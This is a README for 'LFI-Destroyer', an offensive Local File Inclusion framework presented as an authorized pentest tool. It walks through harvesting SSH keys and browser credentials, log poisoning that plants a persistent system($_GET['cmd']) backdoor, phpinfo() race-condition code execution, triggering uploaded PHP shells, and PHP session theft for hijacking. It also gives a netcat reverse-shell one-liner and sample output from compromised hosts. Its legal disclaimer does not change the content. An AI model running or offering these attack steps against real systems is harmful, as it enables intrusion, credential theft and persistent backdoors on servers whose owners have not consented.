🔥 LFI-Destroyer – Authorized Penetration Testing Framework
LFI-Destroyer is a comprehensive, modular Local File Inclusion (LFI) exploitation framework designed for authorized security professionals. It combines multiple attack techniques into a single, easy‑to‑use tool:

SSH & Browser Artifact Fuzzing – Hunt for SSH keys, Putty PPK, WinSCP, FileZilla, Firefox, Chrome, Edge, and Brave credentials on Linux & Windows.

Log Poisoning → Reverse Shell – Automatic RCE via writable log files with custom payload support.

phpinfo() Race Condition RCE – Fully automated LFI2RCE when file_uploads=On and phpinfo() is accessible.

Uploaded File Trigger – Include and execute an already‑uploaded PHP shell via LFI.

PHP Session Enumeration – Download and decode session files for hijacking.

⚠️ LEGAL DISCLAIMER
This tool is for educational purposes and authorized security testing only.
You must have explicit written permission from the system owner before using it.
Unauthorized access to computer systems is illegal and unethical.
The author assumes no liability for any misuse or damage caused by this tool.

📦 Installation
bash
# 1. Clone the repository
git clone https://github.com/RevShellXD/LFI-Destroyer.git
cd LFI-Destroyer

# 2. Install dependencies (only colorama is required; others are optional)
pip install colorama

# 3. Make the main script executable
chmod +x LFI-Destroyer.py
🚀 Quick Start – Mode 1 (SSH / Browser Artifact Fuzzing)
bash
python3 LFI-Destroyer.py
Select Linux or Windows.

# 📂 Directory Structure

LFI-Destroyer/
LFI-Destroyer.py          

modes/__init__.py ,mode3_phpinfo_race.py, mode4_upload_trigger.py, mode5_session_grabber.py           

artifacts/               

README.md




Choose attack mode 1.

Follow the prompts to configure your LFI endpoint.

The script will automatically enumerate users, verify existence (Windows uses NTUSER.DAT beacon), and recursively fuzz for SSH keys, browser credentials, and other sensitive files.

All artifacts are saved in the ./artifacts/ directory.

📝 Mode 2 – Log Poisoning & Reverse Shell
bash
python3 LFI-Destroyer.py --log-poisoning --log-vector ua
Or run interactively and select mode 2.

What happens:

Injects a PHP test payload via User‑Agent (or your chosen vector).

Tries to include common log files (Apache, Nginx, SSH, system logs, XAMPP/WAMP/IIS on Windows).

If a writable log is found, injects a persistent system($_GET['cmd']) backdoor.

Confirms RCE with id (Linux) or whoami (Windows).

Prompts for a reverse shell listener and delivers a bash (Linux) or PowerShell (Windows) reverse shell.

Custom reverse shell:

bash
python3 LFI-Destroyer.py --log-poisoning --log-vector ua --custom-shell "nc {lhost} {lport} -e /bin/bash"
Placeholders {lhost} and {lport} will be replaced with your listener IP/port.

🧪 BETA – Mode 3: phpinfo() Race Condition RCE
Status: Beta – Works reliably on misconfigured PHP servers with file_uploads=On and accessible phpinfo().

Prerequisites:

file_uploads = On (detected automatically)

post_max_size ≥ upload_max_filesize (detected automatically)

LFI vulnerability

Access to a phpinfo() page (script brute‑forces common locations)

Run:

bash
python3 LFI-Destroyer.py
# Select mode 3
Provide LFI details as usual
Script will:
  - Bruteforce phpinfo() (OS‑specific wordlist)
  - Parse upload_max_filesize and post_max_size
  - Execute the race condition attack (upload + LFI)
  - Confirm RCE
  - Offer reverse shell
Example output:

text
[*] Bruteforcing phpinfo.php (45 paths) ...
[+] Found phpinfo.php at http://192.168.1.100/phpinfo.php
[+] file_uploads=On (max size: 8M)
[+] Attempt race condition RCE? (y/N): y
[*] Race attempt 1/3 ...
[+] Extracted temporary file path: /tmp/phpABC123
[+] RCE confirmed via temporary file!
[!] LOG POISONING SUCCESSFUL! Ready to escalate to reverse shell.
🧪 BETA – Mode 4: Uploaded File Trigger
Status: Beta – Assumes you have already uploaded a PHP shell (e.g., via another vulnerability or manual upload). The script then uses LFI to include it and execute commands.

Two operation modes:

Exact path – You know where the file is (e.g., uploads/shell.php).

Brute‑force – Let the script try common upload directories + filenames.

Run:

bash
python3 LFI-Destroyer.py
# Select mode 4
 Enter path or 'brute'
 Script will:
  - Attempt LFI inclusion with ?cmd=whoami
  - If successful, show output and offer reverse shell
Example:

text
Enter path to uploaded file (relative to web root), or 'brute' to try common locations: uploads/shell.php
[*] Trying uploads/shell.php ...
[+] SUCCESS! Shell executed at uploads/shell.php
[+] Command output:
www-data
Attempt reverse shell? (y/N): y
🧪 BETA – Mode 5: PHP Session Enumeration & Hijacking
Status: Beta – Reads session files from session.save_path (determined via phpinfo() or fallback wordlist), saves them, and attempts base64 decoding when needed.

Run:

bash
python3 LFI-Destroyer.py
# Select mode 5
 Provide session ID or 'list' to enumerate
Examples:

text
Enter session ID to retrieve (PHPSESSID), or 'list' to enumerate: abc123
[*] Reading /var/lib/php/sessions/sess_abc123 ...
[+] Session file retrieved!
[--- SESSION DATA (raw) ---]
username|s:5:"admin";user_id|i:1;
Session directory listing (if directory indexing is enabled):

text
Enter session ID to retrieve (PHPSESSID), or 'list' to enumerate: list
[+] Found 12 session files:
  - sess_abc123
  - sess_def456
  ...
All session files are saved to artifacts/session_*.
If the data appears base64‑encoded, the script automatically attempts the php://filter/convert.base64-decode bypass and saves a decoded version.

🧠 Advanced Mode (-adv)
Enable additional LFI techniques:

POST parameter LFI

Cookie/Header LFI

PHP wrappers (php://filter, data://, expect://)

Custom wordlist for artifact fuzzing

Auto‑depth detection

bash
python3 LFI-Destroyer.py -adv
⚙️ Command‑Line Flags
Flag	Description
--os {linux,windows}	Force target OS
--auto-depth	Auto‑detect traversal depth
--wordlist FILE	Custom file path wordlist (overrides OS defaults)
--userlist FILE	Custom Windows usernames (mode 1)
--beacon-file PATH	Custom beacon file (default: NTUSER.DAT)
--custom-shell CMD	Custom reverse shell command (use {lhost} and {lport})
--log-poisoning	Enable mode 2 from CLI (no interactive mode selection)
--log-vector {ua,referer,xff,header,param}	Injection vector for log poisoning
--log-header NAME	Custom header name (for vector=header)
--log-param NAME	Custom parameter name (for vector=param)
--log-files FILE	Custom log path list
--rce-command CMD	Test command for RCE verification
--proxy URL	HTTP proxy (e.g., http://127.0.0.1:8080)
--rate FLOAT	Delay between requests (seconds)
--output FILE	Save results to JSON
--dry-run	Test configuration – no requests sent
--no-color	Disable colored output


Modes 3, 4, and 5 are loaded dynamically from the modes/ directory.
You can easily add new modes by dropping a Python file with a run(config, fuzzer) function.

🧰 Requirements
Python 3.8+

colorama (optional, for colored output)

No other dependencies – the script uses only the standard library.

📜 License & Author
Written by RevShellXD
Licensed under the MIT License – free for authorized security professionals.

For educational and authorized testing only.
If you break the law with this tool, you are solely responsible.

⭐ Star & Contribute
If you find this tool useful, please star the repository on GitHub.
Pull requests and new mode contributions are welcome – follow the simple module interface in modes/__init__.py.

